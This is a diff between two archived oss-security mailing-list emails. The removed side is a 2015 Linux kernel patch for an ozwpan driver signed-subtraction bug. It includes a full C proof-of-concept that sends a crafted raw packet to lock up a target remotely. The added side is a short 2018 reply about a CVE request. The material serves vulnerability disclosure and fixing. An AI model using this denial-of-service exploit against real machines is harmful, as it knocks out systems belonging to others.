@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["4550" "Wednesday" "13" "May" "2015" "20:58:20" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431543500-4847-5-git-send-email-Jason@zx2c4.com>" "179" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" nil nil nil "5" "2015051318:58:20" "[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS" (number mark "        Jason@zx2c4. May 13  179/4550  " thread-indent "\"[oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS\"\n") "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>" ("<20150513185322.GA4029@kroah.com>" "<1431543500-4847-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1315" "Monday" "6" "August" "2018" "14:18:19" "+0300" "Henri Salo" "henri@nerv.fi" "<20180806111819.kc3o3vd266qdjich@tunkki.bugs.fi>" "35" "Re: [oss-security] Requesting CVE number for Qt Creator / Botan issue" nil nil nil "8" "2018080611:18:19" "[oss-security] Requesting CVE number for Qt Creator / Botan issue" (number mark "U       henri@nerv.f Aug  6   35/1315  " thread-indent "\"Re: [oss-security] Requesting CVE number for Qt Creator / Botan issue\"\n") "<2145096.zCNlfaKS3V@tjmaciei-mobl1>" ("<2145096.zCNlfaKS3V@tjmaciei-mobl1>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 21871 invoked by uid 550); 13 May 2015 18:59:22 -0000
+Received: (qmail 26361 invoked by uid 550); 6 Aug 2018 11:18:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,207 +11,55 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 18106 invoked from network); 13 May 2015 18:58:57 -0000
-DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
-	:subject:date:message-id:in-reply-to:references; s=mail; bh=n9hQ
-	AYzYkvWQDNJQwGLkzcQsItw=; b=GRWNQksjIN9yiU2euyBYVTBKlIT9TbXyKBk3
-	7/Fg7YOuHUJhBLBKbQJ2IINEh5Avh7gg9f60kiasAOZZpQ+LdT4aIhqp0cY/v8R6
-	NRxLvHHXUULEgNjTngApmKgrjKCHWk+zBQLgplUW6VlsM6MUWJrJqXQ9hJwksCpr
-	+jw4OMq//xnGMJgYaoWtihA+RjhiZB4SnD45ws9NrBnAy7Ao5Ju20HplMnAbmVV6
-	IJG6pKOsOTfqhrRKnl4Id1TOuhxox2T4Zq/CrZdJ8wrdfXbW/iU1S7jjUDs2yGwO
-	/ffW3LDQEPN4m1k16m43tAVDGU+YXhy/8FltKgExehJ3OgQhkg==
-Message-Id: <1431543500-4847-5-git-send-email-Jason@zx2c4.com>
-X-Mailer: git-send-email 2.3.6
-In-Reply-To: <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
-References: <20150513185322.GA4029@kroah.com>
- <1431543500-4847-1-git-send-email-Jason@zx2c4.com>
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Wed, 13 May 2015 20:58:20 +0200
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] [PATCH 4/4] ozwpan: unchecked signed subtraction leads to DoS
-To: oss-security <oss-security@lists.openwall.com>,
-	linux-kernel@vger.kernel.org,
-	Shigekatsu Tateno <shigekatsu.tateno@atmel.com>,
-	Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-	devel@driverdev.osuosl.org
+Received: (qmail 26338 invoked from network); 6 Aug 2018 11:18:39 -0000
+X-Virus-Scanned: Debian amavisd-new at coconut.nerv.fi
+Date: Mon, 6 Aug 2018 14:18:19 +0300
+From: Henri Salo <henri@nerv.fi>
+To: Thiago Macieira <thiago@macieira.org>
+Cc: oss-security@lists.openwall.com
+Message-ID: <20180806111819.kc3o3vd266qdjich@tunkki.bugs.fi>
+References: <2145096.zCNlfaKS3V@tjmaciei-mobl1>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="syrch3n2hb3ugtkc"
+Content-Disposition: inline
+In-Reply-To: <2145096.zCNlfaKS3V@tjmaciei-mobl1>
+User-Agent: NeoMutt/20170113 (1.7.2)
+Subject: Re: [oss-security] Requesting CVE number for Qt Creator / Botan issue
 
-The subtraction here was using a signed integer and did not have any
-bounds checking at all. This commit adds proper bounds checking, made
-easy by use of an unsigned integer. This way, a single packet won't be
-able to remotely trigger a massive loop, locking up the system for a
-considerable amount of time. A PoC follows below, which requires
-ozprotocol.h from this module.
+--syrch3n2hb3ugtkc
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-=-=-=-=-=-=
+On Sun, Aug 05, 2018 at 11:21:00AM -0700, Thiago Macieira wrote:
+> I would like to request a CVE number for an advisory about Qt Creator
+> shipping old Botan (and potentially vulnerable) sources.
 
- #include <arpa/inet.h>
- #include <linux/if_packet.h>
- #include <net/if.h>
- #include <netinet/ether.h>
- #include <stdio.h>
- #include <string.h>
- #include <stdlib.h>
- #include <endian.h>
- #include <sys/ioctl.h>
- #include <sys/socket.h>
+https://cveform.mitre.org/
 
- #define u8 uint8_t
- #define u16 uint16_t
- #define u32 uint32_t
- #define __packed __attribute__((__packed__))
- #include "ozprotocol.h"
+--=20
+Henri Salo
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+--syrch3n2hb3ugtkc
+Content-Type: application/pgp-signature; name="signature.asc"
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+-----BEGIN PGP SIGNATURE-----
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+iQIzBAABCAAdFiEE/aVSDznAZReWTkxKJ633pE6qdXQFAltoLnkACgkQJ633pE6q
+dXSxZBAAi+nEF9Cu0p5/3ZZGgnly+XyDJWPcu4vD7Srsv/b8QZe8Fhl33/0tExHz
+SPQrH73V4OHqevEpmwCbVKuQF4HJ1vHPnBq33SVli785N4F6igsgPW0Uwb8RoINm
+7gi3Cy/Q29vO8ZlgiX5KDCaMsNmU18/ktkHE4UYtLahzxNGGBRD38jJJgdhjZnNh
+UKRJo96ezUQ0otvHAns+FzEqVuTGj6w08T9ETAytBr5z5abQPSHN8RhUz/Bz2fjY
+cTigDTI8zWj/qsywV5anC2aWrX8Kt3JqTSbY5sYs2KF/CWdmDDS5q7/hwJVXahfT
+ofhytP+SK33rLTrPamQYkt5mUR39481ztCvn2nYY/daHy9mm09BIodtBAKAgi/o0
+LUbNMU4MbYxcsv5WlSMnX/yA5XAkrOkDy/4yZJhCfoQBfHGD31nttcPmwkZnnag2
+05A+C3yTpn8LMn+Ds6OkbFfiHaT2klYVrqYsebJswDFebEdzbzxuVp39UpYQ13hG
+AzhtCzss28KrvrDaamVpniw/YbDLk62/b3RBG/iSGWPiv6nuav7bykx64skiQuFn
+M8H0CSfUFcGnM25Ri4jtuIwrvhWe83XDehScgocdwsLQnzW1HroM1xDgEDyC//G7
+XxTpRI/ImzPXrKhg3b8fvMm/JibWtlMHQZ2d+zFY0pSzEKvYjLQ=
+=wQMD
+-----END PGP SIGNATURE-----
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
-
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
-
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-		struct oz_elt oz_elt2;
-		struct oz_multiple_fixed oz_multiple_fixed;
-	} __packed packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 0,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		},
-		.oz_elt2 = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_multiple_fixed) - 3
-		},
-		.oz_multiple_fixed = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_USB_ENDPOINT_DATA,
-			.endpoint = 0,
-			.format = OZ_DATA_F_MULTIPLE_FIXED,
-			.unit_size = 1,
-			.data = {0}
-		}
-	};
-
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &packet, sizeof(packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozusbsvc1.c | 4 +++-
- 1 file changed, 3 insertions(+), 1 deletion(-)
-
-diff --git a/drivers/staging/ozwpan/ozusbsvc1.c b/drivers/staging/ozwpan/ozusbsvc1.c
-index 2e67956..934a571 100644
---- a/drivers/staging/ozwpan/ozusbsvc1.c
-+++ b/drivers/staging/ozwpan/ozusbsvc1.c
-@@ -326,11 +326,13 @@ static void oz_usb_handle_ep_data(struct oz_usb_ctx *usb_ctx,
- 			struct oz_multiple_fixed *body =
- 				(struct oz_multiple_fixed *)data_hdr;
- 			u8 *data = body->data;
--			int n;
-+			unsigned int n;
- 			if (!body->unit_size)
- 				break;
- 			n = (len - sizeof(struct oz_multiple_fixed)+1)
- 				/ body->unit_size;
-+			if (n > len / body->unit_size)
-+				break;
- 			while (n--) {
- 				oz_hcd_data_ind(usb_ctx->hport, body->endpoint,
- 					data, body->unit_size);
--- 
-2.3.6
-
+--syrch3n2hb3ugtkc--
